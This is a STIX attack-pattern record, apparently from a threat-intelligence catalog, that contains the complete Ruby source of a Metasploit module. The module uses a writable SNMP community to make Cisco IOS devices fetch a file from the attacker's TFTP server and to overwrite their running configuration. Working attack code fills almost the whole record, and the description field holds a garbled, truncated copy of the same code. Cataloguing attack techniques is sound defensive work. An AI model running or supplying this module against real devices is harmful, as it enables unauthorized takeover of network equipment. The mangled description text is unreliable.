{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c7469984-d71c-4d57-ab77-1327037f23c2",
    "created": "2024-08-14T16:27:42.231901Z",
    "modified": "2024-08-14T16:27:42.231904Z",
    "name": "Cisco IOS SNMP File Upload (TFTP)",
    "description": "Override the running config 'ccCopyProtocol'                => '1.3.6.1.4.1.9.9.96.1.1.1.1.2.' 'ccCopySourceFileType'          => '1.3.6.1.4.1.9.9.96.1.1.1.1.3.' 'ccCopyDestFileType'            => '1.3.6.1.4.1.9.9.96.1.1.1.1.4.' 'ccCopyServerAddress'           => '1.3.6.1.4.1.9.9.96.1.1.1.1.5.' 'ccCopyFileName'                => '1.3.6.1.4.1.9.9.96.1.1.1.1.6.' 'ccCopyEntryRowStatus'          => '1.3.6.1.4.1.9.9.96.1.1.1.1.14.'  ] ] 'DefaultAction' => 'Upload_File' ) register_options([ OptPath.new('SOURCE', [true, \"The filename to upload\" ]) OptAddressLocal.new('LHOST', [ false, \"The IP address of the system running this module\" ]) ]) end  # # Start the TFTP Server # def setup  @path     = datastore['SOURCE'] @filename = @path.split(/[\\/\\\\]/)[-1] #/  # Setup is called only once print_status(\"Starting TFTP server...\") @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })  # Register our file name and data ::File.open(@path, \"rb\") do |fd| buff = fd.read(fd.stat.size) @tftp.register_file(@filename, buff) end  @tftp.start add_socket(@tftp.sock)  @main_thread = ::Thread.current  end  # # Kill the TFTP server # def cleanup # Cleanup is called once for every single thread if ::Thread.current == @main_thread # Wait 5 seconds for background transfers to complete print_status(\"Providing some time for transfers to complete...\") ::IO.select(nil, nil, nil, 5.0)  print_status(\"Shutting down the TFTP service...\") if @tftp @tftp.close rescue nil @tftp = nil end end end  def run_host(ip)  begin lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)  session = rand(255) + 1  snmp = connect_snmp  # OID variables to for checking if the host is alive and if the community is valid ciscoFlashCopyEntryStatus = '1.3.6.1.4.1.9.9.10.1.2.1.1.11.' ciscoFlashCopyCommand = '1.3.6.1.4.1.9.9.10.1.2.1.1.2.'  varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyEntryStatus}#{session}\" , SNMP::Integer.new(6)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyEntryStatus}#{session}\" , SNMP::Integer.new(5)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyCommand}#{session}\" , SNMP::Integer.new(2)) value = snmp.set(varbind)   # If the above line didn't throw an error, the host is alive and the community is valid print_status(\"Copying file #{@filename} to #{ip}...\")  if(action.name == 'Upload_File')  varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopyProtocol']}#{session}\" , SNMP::Integer.new(1)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopyServerAddress']}#{session}\", SNMP::IpAddress.new(lhost)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopySourceName']}#{session}\", SNMP::OctetString.new(@filename)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopyDestinationName']}#{session}\", SNMP::OctetString.new(@filename)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyEntryStatus}#{session}\" , SNMP::Integer.new(1)) value = snmp.set(varbind)  elsif(action.name == 'Override_Config')  varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyProtocol']}#{session}\" , SNMP::Integer.new(1)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ccCopySourceFileType']}#{session}\" , SNMP::Integer.new(1)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyDestFileType']}#{session}\" , SNMP::Integer.new(4)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyServerAddress']}#{session}\", SNMP::IpAddress.new(lhost)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyFileName']}#{session}\", SNMP::OctetString.new(@filename)) value = snmp.set(varbind)  varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyEntryRowStatus']}#{session}\" , SNMP::Integer.new(1)) value = snmp.set(varbind) end   # No need to make noise about timeouts rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion rescue ::Interrupt raise $! rescue ::Exception => e print_error(\"#{ip} Error: #{e.class} #{e} #{e.backtrace}\") ensure disconnect_snmp end end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/cisco_upload_file.rb",
            "external_id": "cisco_upload_file.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Cisco\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Cisco IOS SNMP File Upload (TFTP)',\n      'Description' => %q{\n          This module will copy file to a Cisco IOS device using SNMP and TFTP.\n        The action Override_Config will override the running config of the Cisco device.\n        A read-write SNMP community is required. The SNMP community scanner module can\n        assist in identifying a read-write community. The target must\n        be able to connect back to the Metasploit system and the use of\n        NAT will cause the TFTP transfer to fail.\n        },\n      'Author'      =>\n        [\n          'pello <fropert[at]packetfault.org>',\n          'ct5595'\n        ],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [\n            'Upload_File',\n            {\n              'Description'                   => 'Upload the file',\n              'ciscoFlashCopyProtocol'        => '1.3.6.1.4.1.9.9.10.1.2.1.1.3.',\n              'ciscoFlashCopyServerAddress'   => '1.3.6.1.4.1.9.9.10.1.2.1.1.4.',\n              'ciscoFlashCopySourceName'      => '1.3.6.1.4.1.9.9.10.1.2.1.1.5.',\n              'ciscoFlashCopyDestinationName' => '1.3.6.1.4.1.9.9.10.1.2.1.1.6.',\n            }\n          ],\n          [\n            'Override_Config',\n            {\n              'Description'                   => 'Override the running config',\n              'ccCopyProtocol'                => '1.3.6.1.4.1.9.9.96.1.1.1.1.2.',\n              'ccCopySourceFileType'          => '1.3.6.1.4.1.9.9.96.1.1.1.1.3.',\n              'ccCopyDestFileType'            => '1.3.6.1.4.1.9.9.96.1.1.1.1.4.',\n              'ccCopyServerAddress'           => '1.3.6.1.4.1.9.9.96.1.1.1.1.5.',\n              'ccCopyFileName'                => '1.3.6.1.4.1.9.9.96.1.1.1.1.6.',\n              'ccCopyEntryRowStatus'          => '1.3.6.1.4.1.9.9.96.1.1.1.1.14.'\n            }\n          ]\n        ],\n        'DefaultAction' => 'Upload_File'\n    )\n    register_options([\n      OptPath.new('SOURCE', [true, \"The filename to upload\" ]),\n      OptAddressLocal.new('LHOST', [ false, \"The IP address of the system running this module\" ])\n    ])\n  end\n\n  #\n  # Start the TFTP Server\n  #\n  def setup\n\n    @path     = datastore['SOURCE']\n    @filename = @path.split(/[\\/\\\\]/)[-1] #/\n\n    # Setup is called only once\n    print_status(\"Starting TFTP server...\")\n    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })\n\n    # Register our file name and data\n    ::File.open(@path, \"rb\") do |fd|\n      buff = fd.read(fd.stat.size)\n      @tftp.register_file(@filename, buff)\n    end\n\n    @tftp.start\n    add_socket(@tftp.sock)\n\n    @main_thread = ::Thread.current\n\n  end\n\n  #\n  # Kill the TFTP server\n  #\n  def cleanup\n    # Cleanup is called once for every single thread\n    if ::Thread.current == @main_thread\n      # Wait 5 seconds for background transfers to complete\n      print_status(\"Providing some time for transfers to complete...\")\n      ::IO.select(nil, nil, nil, 5.0)\n\n      print_status(\"Shutting down the TFTP service...\")\n      if @tftp\n        @tftp.close rescue nil\n        @tftp = nil\n      end\n    end\n  end\n\n  def run_host(ip)\n\n    begin\n      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)\n\n      session = rand(255) + 1\n\n      snmp = connect_snmp\n\n      # OID variables to for checking if the host is alive and if the community is valid\n      ciscoFlashCopyEntryStatus = '1.3.6.1.4.1.9.9.10.1.2.1.1.11.'\n      ciscoFlashCopyCommand = '1.3.6.1.4.1.9.9.10.1.2.1.1.2.'\n\n      varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyEntryStatus}#{session}\" , SNMP::Integer.new(6))\n      value = snmp.set(varbind)\n\n      varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyEntryStatus}#{session}\" , SNMP::Integer.new(5))\n      value = snmp.set(varbind)\n\n      varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyCommand}#{session}\" , SNMP::Integer.new(2))\n      value = snmp.set(varbind)\n\n\n      # If the above line didn't throw an error, the host is alive and the community is valid\n      print_status(\"Copying file #{@filename} to #{ip}...\")\n\n      if(action.name == 'Upload_File')\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopyProtocol']}#{session}\" , SNMP::Integer.new(1))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopyServerAddress']}#{session}\", SNMP::IpAddress.new(lhost))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopySourceName']}#{session}\", SNMP::OctetString.new(@filename))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ciscoFlashCopyDestinationName']}#{session}\", SNMP::OctetString.new(@filename))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{ciscoFlashCopyEntryStatus}#{session}\" , SNMP::Integer.new(1))\n        value = snmp.set(varbind)\n\n      elsif(action.name == 'Override_Config')\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyProtocol']}#{session}\" , SNMP::Integer.new(1))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ccCopySourceFileType']}#{session}\" , SNMP::Integer.new(1))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyDestFileType']}#{session}\" , SNMP::Integer.new(4))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyServerAddress']}#{session}\", SNMP::IpAddress.new(lhost))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyFileName']}#{session}\", SNMP::OctetString.new(@filename))\n        value = snmp.set(varbind)\n\n        varbind = SNMP::VarBind.new(\"#{action.opts['ccCopyEntryRowStatus']}#{session}\" , SNMP::Integer.new(1))\n        value = snmp.set(varbind)\n      end\n\n\n    # No need to make noise about timeouts\n    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"#{ip} Error: #{e.class} #{e} #{e.backtrace}\")\n    ensure\n      disconnect_snmp\n    end\n  end\nend\n"
}